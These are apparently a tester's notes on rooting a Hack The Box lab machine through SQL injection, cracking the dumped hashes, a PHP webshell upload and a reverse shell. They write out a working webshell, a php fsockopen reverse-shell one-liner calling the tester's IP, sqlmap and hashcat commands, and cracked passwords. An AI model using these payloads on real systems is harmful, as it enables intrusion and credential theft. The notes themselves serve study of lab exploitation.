# Usage — 10.129.55.135

**Status:** ✅ **ROOTED** — user.txt + root.txt captured. Full chain: unauth SQLi → creds → file-upload RCE → password reuse → sudo/7z listfile leak of root's SSH key.

- Target: `10.129.55.135`
- Hostnames: `usage.htb`, `admin.usage.htb` — **NOT yet in /etc/hosts** (needs sudo password; using `--resolve` / `-H 'Host:'` meanwhile)
- Flags: user + root
- Queued CWES classes for this box: **blind SQLi**, **file upload**

## Kill chain
- [x] P1 Recon (nmap full + services)
- [x] P3 Web enum (vhosts, dirbrute, source, auth mechanism)
- [x] P4 Web exploit — SQLi on `/forget-password` `email` → DB dumped → 3 creds cracked
- [x] P5 Foothold — file upload → webshell → reverse shell as `dash` (+ SSH key found)
- [x] P6 Local recon → **pivot to `xander`; `sudo -l` = NOPASSWD custom binary**
- [x] P6b Container? — **no**, bare-metal host `usage` (Ubuntu 22.04), ruled out early
- [x] P7 Privesc → **root** via `sudo /usr/bin/usage_management` (7z `@`-listfile leaks root SSH key)

---

## 1. Infrastructure

### Ports

| port | service | version | notes |
|---|---|---|---|
| 22/tcp | ssh | OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 | Ubuntu 22.04 (jammy) tell. Not an entry without creds/key. |
| 80/tcp | http | nginx 1.18.0 (Ubuntu) | 301 → `http://usage.htb/`, so name-based vhosts |

Only 2 ports open across all 65535 (rest = closed/reset, not filtered — clean scan).

### Stack read

- **Laravel** on both vhosts — `XSRF-TOKEN` + `laravel_session` cookies, both AES-encrypted
  JSON blobs (`{"iv":...,"value":...,"mac":...}` base64'd). `X-Frame-Options`,
  `X-XSS-Protection`, `X-Content-Type-Options` set = Laravel middleware defaults.
- No `X-Powered-By`, no PHP version leak. nginx fronting php-fpm.
- OpenSSH 8.9p1 + nginx 1.18.0 both = **Ubuntu 22.04**.

---

## 2. Enumeration

### vhosts

`ffuf` Host-header fuzz, `subdomains-top1million-5000.txt`, baseline 301/178:

| vhost | status | size | notes |
|---|---|---|---|
| `admin.usage.htb` | 200 | 3304 | `<title>Admin | Login</title>` — separate Laravel admin app |

### Endpoints

Sources: ffuf (flaky, see §7) + **Burp export** `loot/Site_Requests` (17 items, parsed with
`exploits/burp_parse.py --inventory`). Several of these ffuf never found.

| host | path | method | status | notes |
|---|---|---|---|---|
| usage.htb | `/` | GET | 200 | = the login page |
| usage.htb | `/login` | GET | 200 | form → `POST /post-login` |
| usage.htb | `/post-login` | **POST** | 302 | `_token`, `email`, `password` |
| usage.htb | `/registration` | GET | 200 | form → `POST /post-registration` |
| usage.htb | `/post-registration` | **POST** | 302 | `_token`, `name`, `email`, `password` |
| usage.htb | `/forget-password` | GET | ? | **linked from `/login`, ffuf never found it — untested** |
| usage.htb | `/dashboard` | GET | 200 / 302 | authed only ("Daily Blogs"); 302→`/login` when not |
| usage.htb | `/logout` | GET | 302 | |
| admin.usage.htb | `/` | GET | 200 | the admin login page itself |
| admin.usage.htb | `/admin` | GET | 302 | → `/admin/auth/login` |
| admin.usage.htb | `/admin/auth/login` | **POST** | 302 | `username`, `password`, `remember`, `_token` |
| admin.usage.htb | `/vendor` | GET | 301 | asset dir, see fingerprint below |

### Admin panel fingerprint — **`encore/laravel-admin`**

Asset paths in the admin login HTML give the package away outright:

```
/vendor/laravel-admin/AdminLTE/bootstrap/css/bootstrap.min.css
/vendor/laravel-admin/AdminLTE/dist/css/AdminLTE.min.css
/vendor/laravel-admin/AdminLTE/plugins/iCheck/square/blue.css
/vendor/laravel-admin/font-awesome/css/font-awesome.min.css
/vendor/laravel-admin/AdminLTE/plugins/jQuery/jQuery-2.1.4.min.js
```

That explains the non-stock `/admin/auth/login` route (guessed in the earlier pass —
confirmed here). Third-party package + pinned version = **known-CVE question** (P4 last item).
**Version: `1.8.18`** — from the authed `/admin` dashboard (§3), not from `/vendor`.

### Auth oracle (from the Burp captures)

`POST /post-login` discriminates purely by **`Location:` header** — clean boolean signal:

| creds | Location | meaning |
|---|---|---|
| `test@test.com` / `password` | `/dashboard` | **success** (user registered this account) |
| `test@test.com` / `test` | `/login` | failure |

`POST /admin/auth/login` with `test`/`test` → 302 to `admin.usage.htb/` (= back to the login
page) = failure. No error text in either body, so no user-enum signal *yet* from response
content — only from the redirect target.

---

## 3. Web attack surface

Every input seen so far. Classes column = P4 sweep progress.

| input | endpoint | method | classes tried | result |
|---|---|---|---|---|
| `email` | `/post-login` | POST | creds | ✅ **valid login** — `raj@usage.htb:xander`, `raj@raj.com:xander` |
| `password` | `/post-login` | POST | creds | ✅ as above |
| `name` | `/post-registration` | POST | — | untested |
| `email` | `/post-registration` | POST | — | untested |
| `password` | `/post-registration` | POST | — | untested |
| `email` | `/forget-password` | POST | SQLi | **🔴 CONFIRMED — OR boolean-blind + UNION (2 cols), MySQL** |
| `_token` | `/forget-password` | POST | — | Laravel CSRF, validated |
| `username` | `/admin/auth/login` | POST | creds | ✅ **valid login** — `admin:whatever1` |
| `password` | `/admin/auth/login` | POST | creds | ✅ as above |
| `remember` | `/admin/auth/login` | POST | — | untested |

### Authenticated admin surface (`admin.usage.htb`, from `loot/admin_recon`, 41 items)

All forms are **`multipart/form-data`** and carry `_token` (CSRF), `_method` (Laravel
method spoofing → PUT), and `_previous_`. Requests are PJAX
(`X-PJAX: true`, `X-Requested-With: XMLHttpRequest`).

| endpoint | method | fields | classes tried | result |
|---|---|---|---|---|
| `/admin` | GET | — | recon | stack + version disclosure (§3) |
| `/admin/auth/users` | GET | — | — | list |
| `/admin/auth/users/1` | POST | `username`, `name`, **`avatar` (file)**, `roles[]`, `permissions[]` | **file upload** | 🔴 **RCE — webshell, §5** |
| `/admin/auth/setting` | POST | `name`, **`avatar` (file)**, `after-save` | file upload | same `avatar` handler |
| `/admin/auth/roles` | GET/POST | `slug`, `name`, `permissions[]` | — | untested |
| `/admin/auth/roles/create` | GET | — | — | untested |
| `/admin/auth/permissions/{1,4}` | POST | `slug`, `name`, `http_method[]`, **`http_path`** | — | untested |
| `/admin/auth/menu/7` | POST | `parent_id`, `title`, `icon`, **`uri`**, `roles[]`, `permission` | — | untested |
| `/admin/auth/logs` | GET | — | recon | operation log (`admin_operation_log`, §4) |

**`/admin/auth/logs` — the operation log.** Renders `admin_operation_log` (§4, MySQL —
**not a file on disk**) as a table: `User | Method | Path | Ip | Input | Created At`.

- The **`Input` column reflects submitted field data back into the page** as JSON, e.g.
  `{"username":"admin","name":"Administrator","roles":["1",null],...}` — attacker-controlled
  data, stored, re-rendered in an admin context. Stored-XSS candidate; untested.
- Our own attacking IP (`10.10.15.212`) is logged on every request. Operational note:
  everything done in this panel is recorded.
- Log-poisoning note: poisoning needs (a) a **file** log and (b) a read/include primitive
  to reach it. This log is a DB table, so it fails (a). The file-based logs here would be
  `storage/logs/laravel.log` (Laravel, verbose given `Env: local`) and nginx
  `access.log`/`error.log` — none reachable without an LFI, which is not confirmed.

**Two file-upload points**, both named `avatar`:

```
POST /admin/auth/users/1     avatar; filename="Screenshot_2026-07-16_09_00_25.png"  Content-Type: image/png
POST /admin/auth/setting     avatar; filename=""     (not populated in this capture)
```

Other inputs worth noting as non-upload candidates: `http_path` and `uri` are
**path-like fields** the app stores and later resolves; `icon` and `slug` are free text.

Reminder: **`encore/laravel-admin 1.8.18`** is now pinned (§3), so P4's
*"exact product+version → searchsploit / advisory"* item is actionable against this
exact surface rather than guesswork.

Notes:
- `_token` is Laravel CSRF — must be carried fresh with the matching session cookie on every
  POST, same trap as the GoodGames Flask-WTF login (a missing/stale token gives a **302 that
  looks like success**).
- Queued classes for this box are blind SQLi + file upload; no upload surface found yet
  (would live behind one of the two logins).

### 🔴 `/forget-password` — `email` — SQL injection (confirmed by hand, sqlmap said no)

**Signal:** `'` → error page, `''` → normal. Textbook string-context injection —
`''` is an escaped literal quote, so the statement re-balances.

> **⚠️ CORRECTION (after reading the official writeup, pp.1-8).** The section below
> blames sqlmap's failure on the second-order signal. **That attribution is wrong.**
> The real discriminator is `--level`. Evidence:
>
> | run | level/risk | `--second-url`? | result |
> |---|---|---|---|
> | ours, first try | defaults | no | ✗ |
> | writeup, first try | defaults | no | ✗ (identical output, incl. `500 x22`, `503 x8`) |
> | **writeup, second try** | **3** | **no** | ✓ found it in 448 requests |
> | ours, detection run | 5 / 3 | yes | ✓ |
> | ours, phase-2 attempt | 1 / 1 | yes | ✗ |
>
> `--second-url` is neither necessary nor sufficient. **`--level` >= 2 is.** The writeup's
> hit was `AND boolean-based blind - WHERE or HAVING clause (subquery - comment)` =
> **risk 1, level 2**. The level-1 plain `AND` variant does not land on this app.
>
> Why the second-order reasoning was wrong even though the app really is POST/Redirect/GET:
> **sqlmap already follows the redirect by itself.** It prompts `got a 302 redirect ...
> follow? [Y/n]` and `resend original POST data to a new location? [Y/n]`, and `--batch`
> answers Y to both. It was diffing the flash page all along. The app behaviour described
> below is real; the claim that it blinded sqlmap was never tested.
>
> **Lesson: a correct observation about the target is not automatically the explanation
> for the tool's behaviour.** Separate "what is the app doing" from "what is the tool
> doing" and verify the second one directly (here: one run varying only `--level` would
> have settled it in 2 minutes).
>
> `--second-url`/`--csrf-token` are harmless but cost 2 extra requests per payload — that
> tripling is what made the run take 33 minutes. The writeup's plain `--level 3` needed 448
> requests total.

**Original (partly wrong) reasoning — kept for the record:**

**Why sqlmap called it clean — the signal isn't in the response it was diffing.**
The POST returns a *constant* 302 with a fixed 374-byte redirect stub:

```
HTTP/1.1 302 Found
Location: http://usage.htb/forget-password
Content-Length: 374          <- always. no error, no message, no length delta
```

Laravel flashes the result into the **session** and renders it on the *next*
`GET /forget-password`. This is the POST/Redirect/GET pattern. sqlmap detects by
comparing responses to the injected request — and that response carries zero
information, identically, for every payload. So: "not injectable."

Compounding factors, all of which also produce *constant* responses:
1. **`_token` CSRF.** Replaying the captured token → Laravel 419 Page Expired on
   every request. Constant response again.
2. **Session rotates every response** — `Set-Cookie` for both `XSRF-TOKEN` and
   `laravel_session` on the 302. The flash message is keyed to the *new* session,
   so a client that doesn't carry the rotated cookie forward can never see it.
3. **Rate.** §7 lesson 2 — this box drops requests above ~40 req/s. Dropped
   responses are noise in sqlmap's stability check.

**Confirmed by sqlmap** once `--second-url` was in play — two techniques:

```
[15:17:20] POST parameter 'email' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable
[15:19:46] target URL appears to be UNION injectable with 2 columns
```

Note sqlmap's own heuristic *still* printed `heuristic (basic) test shows that POST
parameter 'email' might not be injectable` — that check reads the POST response, which
is the constant 302. The deeper tests read the second-order page and found it instantly.
Nice confirmation of the diagnosis: the bug was never hidden, the *oracle* was.

### Tuning: detection flags ≠ exploitation flags

The detection run took ~19 min to confirm and was still grinding at 33 min. Cost model —
**every payload is 3 HTTP requests** here:

| # | request | why |
|---|---|---|
| 1 | `GET /forget-password` | `--csrf-url`, fresh `_token` |
| 2 | `POST /forget-password` | the payload |
| 3 | `GET /forget-password` | `--second-url`, where the signal lands |

× `--delay=0.3` × the `--level=5 --risk=3` payload set. Worse, sqlmap logged
`automatically extending ranges for UNION ... as there is at least one other (potential)
technique found` — because boolean-based had already hit, it widened the UNION search to
**100 columns after already reporting the answer was 2**, burning 14 min.

Phase 2 = `exploits/sqlmap_fp_exploit.sh`: `--technique=BU` (drop error-based, stacked
and the slow time-based), `--union-cols=2`, `--delay=0.1` (3 req/payload ≈ 10 req/s, still
4x under the drop threshold) — **and keep `--level=5 --risk=3`**.

> ### ⚠️ level/risk are not a speed knob — they gate which techniques EXIST
>
> First attempt at the phase-2 script dropped level/risk to defaults on the reasoning
> that "the big payload set was for finding the bug, not using it". Wrong. sqlmap
> immediately reported **`does not seem to be injectable`** on a parameter it had
> confirmed twice 30 minutes earlier.
>
> From `/usr/share/sqlmap/data/xml/payloads/*.xml`:
>
> | risk | level | payload |
> |---|---|---|
> | 1 | 1 | `AND boolean-based blind - WHERE or HAVING clause` |
> | **3** | 1 | `OR boolean-based blind - WHERE or HAVING clause` ← **the one that works here** |
> | 1 | **3** | `Generic UNION query ([RANDNUM]) - custom columns` ← the working UNION fallback |
> | 1 | **2** | `MySQL UNION query ([CHAR]) - custom columns` |
>
> **Every** OR-boolean payload is risk 3 — sqlmap gates them because `OR` matches more
> rows and is riskier against live data. At `--risk=1` the whole family is absent, so the
> run tested `AND boolean` + parameter-replace and quit. Likewise `--level=1` left only
> the `NULL`/`[CHAR]` generic UNION variants, and NULL is exactly what failed.
>
> **Rule: once a technique is confirmed, never lower the level/risk it was found at.**
> Get speed from `--technique`, `--union-cols`, `--delay` — flags that cut *work*, not
> *capability*.
>
> Also logged: `500 (Internal Server Error) - 20 times`. The app surfaces a 500 on
> malformed SQL — same error the manual `'` produced. Payloads are reaching the DB.

**Ctrl-C is free** — sqlmap resumes from `scans/sqlmap/usage.htb/session.sqlite`;
confirmed techniques persist.

**Original detection script:** `exploits/sqlmap_forget_password.sh` (request saved to
`exploits/forget_password.req`, cleaned of the leftover `''` and with
Content-Length corrected). Key flags:

```
--second-url='http://usage.htb/forget-password'     # diff the page the signal lands on
--csrf-token=_token --csrf-url='http://usage.htb/forget-password' --csrf-retries=3
--delay=0.3 --threads=1                             # respect the drop threshold
```

---

---

### 🔎 Admin dashboard leaks the full stack (`GET /admin`, authed)

`encore/laravel-admin`'s default dashboard renders Environment + Dependencies widgets.
Everything below came free once logged in — no probing.

| | |
|---|---|
| PHP | `8.1.2-1ubuntu2.14` (fpm-fcgi) |
| Laravel | **10.18.0** |
| Kernel | `Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64` |
| Web | nginx/1.18.0 |
| Cache driver | **file** |
| Session driver | **file** |
| Queue driver | sync |
| **Env** | **`local`** |
| URL | `http://admin.usage.htb` |

**Dependencies (composer.json constraints + resolved versions):**

```
encore/laravel-admin   1.8.18      <- EXACT VERSION, was the open question
laravel/framework      ^10.10
laravel/sanctum        ^3.2
laravel/tinker         ^2.8
guzzlehttp/guzzle      ^7.2
symfony/filesystem     ^6.3
php                    ^8.1
```

Observations:

- **`encore/laravel-admin` is pinned at `1.8.18`.** §2 identified the package from
  asset paths and §4 confirmed it from the DB schema, but the version was unknown
  and that blocked P4's last item (*"the exact product+version → searchsploit /
  advisory"*). It is now answerable.
- **`Env: local`.** `APP_ENV=local` on a public-facing host — the dev environment
  profile. Worth checking what that changes here (`APP_DEBUG`, error verbosity,
  trusted hosts). Note GoodGames taught that `.env` `DEBUG=True` does **not**
  reliably mean the debugger is live — the config class can override it. Verify,
  don't assume.
- **Hostname is `usage`**, not a 12-hex string → this is very likely **not** a
  container. Relevant to P6b later.
- **Session + cache driver = `file`.** Laravel writes these under
  `storage/framework/{sessions,cache}` on disk rather than to Redis/DB.
- Kernel `5.15.0-101` built 2024-03-05; Ubuntu 22.04 — matches the OpenSSH/nginx
  fingerprint from §1.
- `laravel/tinker` is present (a dev dependency shipped to prod).

### ✅ Authenticated access — both applications

| app | account | verified |
|---|---|---|
| `usage.htb` | `raj@usage.htb` / `xander` | ✅ |
| `usage.htb` | `raj@raj.com` / `xander` | ✅ |
| `admin.usage.htb` | `admin` / `whatever1` | ✅ |

Both identity systems are now open. This changes the attack surface substantially —
everything enumerated in §2/§3 was the **unauthenticated** view. The authenticated
surface of each app has not been mapped yet:

- `usage.htb` authed → only `/dashboard` ("Daily Blogs") seen so far.
- `admin.usage.htb` authed → **entirely unexplored.** It's `encore/laravel-admin`,
  a full CRUD admin panel (§2), so expect file managers, user/role editors,
  import/export, and config screens behind the login.

~~**Still open: the laravel-admin version is not pinned.**~~ **RESOLVED** — the authed
dashboard prints it outright: **`encore/laravel-admin 1.8.18`**. P4's known-CVE item is
now answerable. (Predicted it'd be in a footer/about page; it was the dashboard widget.)

Queued CWES class for this box that hasn't been touched yet: **file upload**.

---

## 4. Loot

| what | where | value |
|---|---|---|
| DB list | sqlmap `--dbs` via `/forget-password` | `information_schema`, `performance_schema`, **`usage_blog`** |
| `users` table (2 rows) | `loot/users_table.csv` | `raj@raj.com` / `raj@usage.htb`, both name `raj` |
| 2x bcrypt hashes | `loot/users_bcrypt.hash` | `$2y$10$...` — **hashcat `-m 3200`** |
| `admin_users` (1 row) | `loot/admin_users.csv` | `admin` / "Administrator", bcrypt + non-null `remember_token` |
| all 3 hashes | `loot/all_bcrypt.hash` | one file for a single hashcat run |
| hashcat potfile results | (cracked, see **Credentials** below) | all 3 fell to bare rockyou |

`usage_blog` is the only non-default schema — MySQL ships the other two.

**`usage_blog` — 15 tables:**

```
admin_menu              admin_operation_log     admin_permissions
admin_role_menu         admin_role_permissions  admin_role_users
admin_roles             admin_user_permissions  admin_users
blog                    failed_jobs             migrations
password_reset_tokens   personal_access_tokens  users
```

Three groups:
- **`admin_*` (9 tables)** — this is `encore/laravel-admin`'s own migration schema
  (menu / roles / permissions / operation log / its own user table). Independent
  confirmation of the §2 fingerprint, which was derived only from asset paths.
- **Laravel framework** — `migrations`, `failed_jobs`, `password_reset_tokens`,
  `personal_access_tokens` (Sanctum). Stock, present on any Laravel app.
- **App** — `blog`, `users`.

Note the app has **two separate identity tables**: `users` (usage.htb) and `admin_users`
(admin.usage.htb). That matches the two independent login forms found in §2 — the
`username` field on the admin panel vs `email` on the main site.

### `admin_users` — the panel account

```
id  name           username  password
1   Administrator  admin     $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
```

- Single row. `username = admin` matches the `username` field on the
  `admin.usage.htb` login form (the main site uses `email` — see §2).
- `avatar` blank; `created_at` 2023-08-13, `updated_at` 2023-08-23 — build-time.
- **`remember_token` is populated** (60 chars). Unlike the `users` rows, where it
  was NULL on both.
- sqlmap's built-in dictionary did not crack it: `1 bcrypt hash(es) not cracked
  with common passwords`. So it's not a top-N password — a real wordlist run is
  needed, not a lucky guess.
- `500 Internal Server Error x852` during the dump is expected: boolean-blind
  payloads make the app throw, and that error IS the oracle (§3).

### 🔑 Credentials

| source | identifier | password | login form |
|---|---|---|---|
| `usage_blog.admin_users` id=1 | `admin` ("Administrator") | `whatever1` | `admin.usage.htb` → `POST /admin/auth/login`, field **`username`** |
| `usage_blog.users` id=2 | `raj@usage.htb` | `xander` | `usage.htb` → `POST /post-login`, field **`email`** |
| `usage_blog.users` id=1 | `raj@raj.com` | `xander` | `usage.htb` → `POST /post-login`, field **`email`** |
| `~/.monitrc` (monit httpd) | `admin` / **`xander`** | `3nc0d3d_pa$$w0rd` | monit UI `127.0.0.1:2812` **AND reused as `xander`'s login password** |

All three verified working against their respective login forms.

```
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2  admin          whatever1
$2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa  raj@usage.htb  xander
$2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.  raj@raj.com    xander
```

- **Both `users` rows share `xander`** — operator reuse across two accounts with
  different emails. Reuse is a property of the *person*; carry it to P6 sprays.
- `admin` differs (`whatever1`), so the two identity systems do **not** share creds.
- `xander` is a name unrelated to `raj` or any username on the box — unguessable,
  only crackable.
- Identifier form matters: panel takes bare `username`, main site takes `email`.
  Same trap as GoodGames, where the email form gave a false "no reuse" negative.

### ✅ Cracked — all three

`hashcat -m 3200 -a 0 all_bcrypt.hash rockyou.txt` — **bare rockyou, no rules, all 3 fell.**

```
admin          whatever1     (admin_users  -> admin.usage.htb, field `username`)
raj@usage.htb  xander        (users        -> usage.htb,       field `email`)
raj@raj.com    xander        (users        -> usage.htb,       field `email`)
```

- Both `users` rows share `xander` — operator password reuse across two accounts.
- `admin` differs (`whatever1`), so the two identity systems do **not** share creds.
- sqlmap's built-in dictionary missed all three; a real wordlist was required.
- `xander` is unrelated to any username on the box — unguessable, only crackable.
- Transfer gotcha logged in `Labs/CLAUDE.md`: copy the hash file VM→host directly.
  Pasting via an editor added a BOM/CRLF and hashcat rejected it. Wasted a cycle.

### Cracking — `users` table### Cracking — `users` table

Both rows are **bcrypt, cost 10** (`$2y$10$` → 2^10 = 1024 rounds). hashcat mode **3200**.

Windows host (RTX 5060 Ti), from `D:\hashcat-7.1.2\`:

```
D:\hashcat-7.1.2\hashcat.exe -m 3200 -a 0 users_bcrypt.hash D:\hashcat-7.1.2\rockyou.txt
D:\hashcat-7.1.2\hashcat.exe -m 3200 -a 0 users_bcrypt.hash D:\hashcat-7.1.2\rockyou.txt -r D:\hashcat-7.1.2\rules\best66.rule
```

⚠️ bcrypt is *deliberately* slow — expect ~50-100 kH/s on the 5060 Ti, i.e. minutes for
bare rockyou and **hours** with a rule stack. This is not MD5 (GoodGames was ~50 GH/s,
roughly a million times faster). Run bare rockyou first and let it finish before
committing to rules.

Observations on the rows themselves:
- Two accounts, **same name `raj`**, different domains — `raj@raj.com` looks like the
  author's throwaway (machine author is `rajHere`), `raj@usage.htb` the in-universe one.
  Different hashes, so different passwords.
- `remember_token` NULL on both — nobody used "Remember Me", so no token to replay.
- `email_verified_at` NULL — verification isn't enforced (relevant to registration flows).
- Timestamps are build-time (Aug 2023), not runtime — these are seeded rows, not activity.
- Reminder from §4: `users` and `admin_users` are **separate** identity tables.

---

## 5. Privesc

### 🔴 Foothold — command execution as `dash`

```
uid=1000(dash) gid=1000(dash) groups=1000(dash)
```

- **`dash` is uid 1000 — a real user account, not `www-data`.** The php-fpm pool runs
  as a human user. Anything that user owns is readable/writable by the web process,
  including their home directory. This is a meaningful difference from the usual
  `www-data` foothold.
- **No supplementary groups.** `groups=1000(dash)` only — no `adm` (log access), no
  `docker`, no `lxd`, no `sudo`. Rules out several standard escalation shortcuts
  before they're tried.
- Consistent with §3: hostname is `usage`, not a container ID — this is the host.
### Vector — unrestricted file upload on `avatar` → webshell → reverse shell

**1. Upload.** `POST` to the admin form, `avatar` field. Extension `.php`, declared
MIME spoofed to `image/jpeg`:

```
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET["cmd"]); ?>
```

The check is on the **declared `Content-Type` header only** — not the extension, not
magic bytes. Claiming `image/jpeg` is sufficient to store a `.php` file.

**2. Land.** Written to a web-served, PHP-executed path:

```
/uploads/images/shell.php
```

Two failures compound: the upload directory is inside the webroot **and** `.php` there
is handed to php-fpm. Either one alone would have made this inert — a path outside the
docroot, or an nginx rule declining to execute in `/uploads`.

**3. Execute.**

```
GET //uploads/images/shell.php?cmd=id
  -> uid=1000(dash) gid=1000(dash) groups=1000(dash)
```

**4. Reverse shell** to `10.10.15.212:9001` (listener convention, `Labs/CLAUDE.md`):

```
php -r '$sock=fsockopen("10.10.15.212",9001);system("bash <&3 >&3 2>&3");'
```

URL-encoded into `cmd`. Uses fd 3 from `fsockopen` directly rather than
`/dev/tcp` — works even where bash lacks net redirection.

**Loot:** a **private SSH key** was found post-shell. _(location TBD — add to `loot/`
and note the owning user.)_

### 🕒 Scheduled cleanup task — observed

Uploaded files under `/uploads/images/` are **deleted after ~2 minutes**, and the
*original avatar is put back*. Restoration (not just deletion) means something is
copying a known-good file in, not merely emptying a directory.

- Exploitation consequence: the webshell has a **~2 minute lifetime**. Get the reverse
  shell out immediately after upload; don't iterate on payloads in place.
- P6 consequence: an unattended task touching a directory the web user controls is
  worth identifying — what runs it, as whom, and on what interval. `pspy` is the tool
  (P6 in `METHODOLOGY.md`); give it a couple of minutes to catch a tick.
- ~~Likely mechanism: `monit`~~ **WRONG — ruled out.** `~/.monitrc` was read (P6 below):
  every rule ends in `then alert`, there is **no `exec` action anywhere**, and the poll is
  `set daemon 60` (60s, not ~2min). monit cannot be doing the cleanup. Mechanism still
  unidentified — cron / systemd timer / Laravel scheduler remain open; `pspy` will show it.

### P6 — local recon as `dash`

**Processes (`ps aux`)**

```
dash  1184/1185  nginx: worker process      <- nginx workers run as dash, not www-data
dash  22594      /usr/bin/monit             <- started 14:37
```

**`monit` is running as `dash`.** monit is a supervision daemon: it polls on a fixed
cycle and fires actions when a check fails. That is the right shape for the ~2 minute
upload cleanup observed above — a poll interval plus a restore action.

**Home directory `/home/dash`**

```
lrwxrwxrwx root root     .bash_history -> /dev/null    <- deliberately nulled, root-owned
-rw-r--r-- dash dash  32 .monit.id
-rw-r--r-- dash dash   6 .monit.pid
-rwx------ dash dash 707 .monitrc          <- 0700, monit config, READABLE BY US
-rw------- dash dash     .monit.state
drwx------ dash dash     .ssh/             <- 0700
-rw-r----- root dash  33 user.txt          <- root:dash 0640 - readable as dash
```

Points:
- `.monitrc` is **0700 and owned by `dash`** — we can read it. monit configs carry the
  poll interval, the check/action rules, and (if the web interface is enabled) an
  `allow user:password` line.
- `.bash_history` is a **root-owned symlink to `/dev/null`** — history is discarded by
  design, not by accident. Nothing to recover there.
- `user.txt` is `root:dash 0640` — root wrote it, group `dash` can read it.
- `.ssh/` is 0700 — this is where the recovered private key came from (§5).
- `.monit.state` / `.monit.id` confirm monit has been running persistently, not a
  one-off.

**monit state files (read)**

```
.monit.id     3a9b9027aa4aa1e4abd7bd41850c738c    (32-hex instance id)
.monit.state  binary; readable strings: "apache", "usage", "rootfs"
.monit.pid    GONE - present at 14:37, absent minutes later
```

- **`.monit.pid` disappearing means monit exited** after the `ps aux` snapshot that
  showed it at PID 22594. A supervision daemon that vanishes and reappears is being
  **cycled** — consistent with the ~2 min rhythm.
- State references a service named **`apache`** — but this host serves with **nginx**
  (§1, and `ps aux` shows nginx workers as `dash`). The monitored service name does not
  match the running web server.
- `.monit.id` is monit's own instance identifier, not a credential.
- **`.monitrc` itself has not been read yet** — that's the file holding the poll
  interval, the check/action rules, and any `allow user:password` for monit's web
  interface. The state/id/pid files are just runtime artifacts of it.

### `~/.monitrc` — read

```
set daemon 60                      # poll interval: 60s
set httpd port 2812
     use address 127.0.0.1         # LOOPBACK ONLY - not reachable externally
     allow admin:3nc0d3d_pa$$w0rd  # <- CREDENTIAL

check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert
check system usage        ... then alert   (memory/cpu/loadavg/swap)
check filesystem rootfs with path /
    if space usage > 80% then alert
```

Three findings:

1. **Credential `admin:3nc0d3d_pa$$w0rd`** — added to §4. A 4th distinct password on
   this box. Reuse is already proven here once (both `users` rows shared `xander`), so
   this is a spray candidate at `su` / SSH / the other services.
2. **monit is NOT the upload-cleanup mechanism.** Every rule terminates in `alert`;
   there is no `exec`. `set daemon 60` is a 60s cycle, which also doesn't match the
   observed ~2min. Corrected above — the cleanup is still unattributed.
3. **New internal-only listener: `127.0.0.1:2812`.** monit's web interface, bound to
   loopback, so unreachable from outside — it never appeared in the nmap sweep (§1
   found only 22 and 80). This is exactly the P6 "internal-only listeners → tunnel them
   out and treat as a new web target" case.

Also note `check process apache` with `/var/run/apache2/apache2.pid` — **this host runs
nginx**, so that check watches a service that isn't there. Explains the `apache` string
in `.monit.state`. Stale/copy-pasted config, not evidence of a hidden Apache.

### `3nc0d3d_pa$$w0rd` reuse — tested against `dash`/`root`, **negative NOT yet validated**

Tried for user and root: failed. Before trusting it, two hazards specific to this string:

1. **`$$` is the shell's PID variable.** Unquoted or double-quoted, `3nc0d3d_pa$$w0rd`
   becomes `3nc0d3d_pa<pid>w0rd`. Interactive `su` prompts are safe; anything scripted
   (`echo "…" | su`, `sshpass -p …`, an unquoted assignment) is not. **Single-quote it.**
2. **Validate against the channel where it must work** — it is monit's own `allow`
   line, so it authenticates to `127.0.0.1:2812` by definition:

   ```
   curl -s -u 'admin:3nc0d3d_pa$$w0rd' http://127.0.0.1:2812/ | head
   ```

   Success there proves the string + quoting are right, which makes the `su` negative
   trustworthy. Failure there means transcription/quoting, not reuse.

**✅ VALIDATED** — `curl -u 'admin:3nc0d3d_pa$$w0rd' http://127.0.0.1:2812/` returns the
monit status page. The string and quoting are correct, so **the `su` negative for
`dash`/`root` is now trustworthy**: this password is not reused for those accounts.

Same discipline as GoodGames (§7): a negative through a gated or lossy channel is not
evidence of absence — but a negative *confirmed against a known-good channel* is.
Note `admin` is monit's own account name, not a system user.

**Harvested from the monit UI:**
- **Monit 5.31.0** (footer `_about` link) — version pinned, known-CVE question available.
- `apache` process: **"Does not exist"** (red) — confirms the stale check in `.monitrc`;
  there is no hidden Apache.
- `rootfs` OK, 67.8% used; system `usage` OK.
- The UI is at `/` with subpages `_about`, `_runtime`, `usage`, `apache`, `rootfs`.

**Reaching it from Kali — use a LOCAL forward, not a reverse tunnel:**

```
ssh -i <key> -L 2812:127.0.0.1:2812 dash@usage.htb -N
# browse http://127.0.0.1:2812
```

`-L` pulls a target-side port to us over an inbound SSH session (port 22 is open, §1,
and we hold a private key from §5). `-R` would require an sshd + credentials on the Kali
box and is only needed when inbound SSH is unavailable — not the case here.

### monit web UI mapped (`loot/monit_recon`, 12 items, via `-L` tunnel)

**Pages:** `/` `/_about` `/_runtime` `/usage` `/apache` `/rootfs`

**Auth:** HTTP Basic — `Authorization: Basic YWRtaW46M25jMGQzZF9wYSQkdzByZA==`
(= `admin:3nc0d3d_pa$$w0rd`). Plus a per-page **`securitytoken`** CSRF value, also set
as a cookie (`securitytoken=...`), and it **rotates every page load** — six distinct
values across 12 requests. Any scripted interaction must scrape it fresh, same discipline
as the Laravel `_token` (§7 lesson 6).

**POST-capable endpoints — one per monitored entity, plus the daemon itself:**

```
<form method=POST action='_runtime'>   action=validate | action=stop
<form method=POST action=usage>        (system check)
<form method=POST action=apache>       (process check)
<form method=POST action=rootfs>       (filesystem check)
```

Captured example:

```
POST /_runtime      securitytoken=0ab4e...&action=validate     -> 302 /_runtime
```

**`/_runtime` discloses the daemon's own configuration:**

| | |
|---|---|
| Monit ID | `3a9b9027aa4aa1e4abd7bd41850c738c` |
